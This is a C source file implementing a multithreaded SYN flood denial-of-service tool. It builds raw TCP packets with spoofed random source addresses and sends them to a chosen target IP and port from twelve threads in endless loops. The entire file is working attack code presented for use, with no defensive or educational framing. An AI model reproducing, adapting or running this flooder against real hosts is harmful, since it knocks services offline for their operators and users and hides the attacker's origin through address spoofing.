#include "protocol.h"

#define TH_N 12

struct thread_arg
{
    int sock;
    struct sockaddr_in *t_addr;
};

int make_socket();
void make_packet(struct tcp_packet *packet, struct sockaddr_in *addr);
void attack(int sock, struct sockaddr_in *addr);
void *synflood_thread_function(void *p);

int syn_flood(char* ip, char *port) {
    struct thread_arg th_arg[TH_N];
    pthread_t thread_id[TH_N];
    struct sockaddr_in t_addr;
    int sock;
    uint32_t t_ip;
    int t_port;
    
    if((t_ip = inet_addr(ip))<0)
    {
        printf("IP error\n");
        return -1;
    }
    t_port=atoi(port);
    if(t_port<=0 || t_port>65535)
    {
        printf("Port error\n");
        return -1;
    }
    srand((unsigned int)time(NULL));
    
    memset(&t_addr, 0 , sizeof(struct sockaddr_in));
    t_addr.sin_addr.s_addr = t_ip;
    t_addr.sin_port = htons((uint16_t)t_port);
    t_addr.sin_family = AF_INET;

    for(int n = 0 ; n<TH_N ; n++)
    {
        th_arg[n].sock = make_socket();
        th_arg[n].t_addr = &t_addr;
        pthread_create(&thread_id[n], NULL, synflood_thread_function, &th_arg[n]);
    }

    sock = make_socket();
    attack(sock, &t_addr);

	return 0;
}

int make_socket()
{
    int sock;
    int on =1;

    if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)  
    {
        perror("socket ");
        return -1;
    }
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
    {
        perror("setsockopt ");
        return -1;
    }
    
    return sock;
}

void make_packet(struct tcp_packet *packet, struct sockaddr_in *addr)
{   
    struct in_addr ranip;
    static uint16_t port = 1024;

    ranip.s_addr = rand();

    make_tcp_header_v2(&packet->tcphdr, ranip, port, addr->sin_addr, ntohs(addr->sin_port), 0, 0, TH_SYN);
    make_ip_header_v2(&packet->iphdr, ranip, addr->sin_addr, sizeof(struct tcphdr));
    port++;
}

void attack(int sock, struct sockaddr_in *addr)
{
    struct tcp_packet packet;

    memset(&packet, 0, sizeof(struct tcp_packet));

    while(1)
    {
        make_packet(&packet, addr);
        
		if(sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr *)addr, sizeof(struct sockaddr_in))<0)
            perror("sendto");
    }
}

void *synflood_thread_function(void *p)
{
    struct thread_arg *arg = (struct thread_arg *)p;
    attack(arg->sock, arg->t_addr);
}